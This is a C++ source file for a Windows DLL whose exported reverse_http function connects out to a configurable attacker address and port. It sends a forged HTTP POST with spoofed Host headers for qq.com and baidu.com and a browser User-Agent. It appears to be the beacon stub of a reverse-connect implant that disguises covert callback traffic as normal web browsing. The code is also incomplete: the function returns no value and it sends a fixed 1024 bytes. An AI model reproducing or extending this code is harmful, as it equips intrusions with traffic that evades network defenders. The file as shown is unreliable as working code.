// reverse_http.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "reverse_http.h"

#pragma comment(lib, "ws2_32")
#pragma warning(disable:4996)


extern "C" 
{
	__declspec(dllexport) BOOL reverse_http()
	{
		int sendNum;
		SOCKET s;
		WSADATA wsa;
		struct sockaddr_in serv;

		char sndBuf[1024], rcvBuf[2048];

		WSAStartup(MAKEWORD(2, 1), &wsa);


		if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		{
			perror("socket error!");
			exit(1);
		}

		memset(&serv, 0, sizeof(serv));
		serv.sin_family = AF_INET;
		serv.sin_port = htons(REVERSEPORT);
		serv.sin_addr.S_un.S_addr = inet_addr(REVERSEIP);

		//printf("0x%x\t0x%x\t0x%x\n", s, (struct sockaddr *)&serv, sizeof serv);
		if ((connect(s, (struct sockaddr *)&serv, sizeof(serv))) < 0)
		{
			perror("connet error!");
			exit(1);
		}

		memset(sndBuf, 0, 1024);
		memset(rcvBuf, 0, 2048);

		//头信息  
		strcat(sndBuf, "POST ");
		strcat(sndBuf, "http://www.qq.com");
		strcat(sndBuf, " HTTP/1.1\r\n");
		strcat(sndBuf, "Host: ");
		strcat(sndBuf, "baidu.com");
		strcat(sndBuf, "\r\n");
		strcat(sndBuf, "Connection: keep-alive\r\n");
		strcat(sndBuf, "Cache-Control: max-age=0\r\n");
		strcat(sndBuf, "Upgrade-Insecure-Requests: 1\r\n");
		strcat(sndBuf, "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36\r\n");
		strcat(sndBuf, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n");
		strcat(sndBuf, "Accept-Encoding: gzip, deflate, br\r\n");
		strcat(sndBuf, "Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\r\n");



		strcat(sndBuf, "\r\n");

		if ((sendNum = send(s, sndBuf, 1024, 0)) < 0)
		{
			perror("send error!");
			exit(1);
		}
	}
}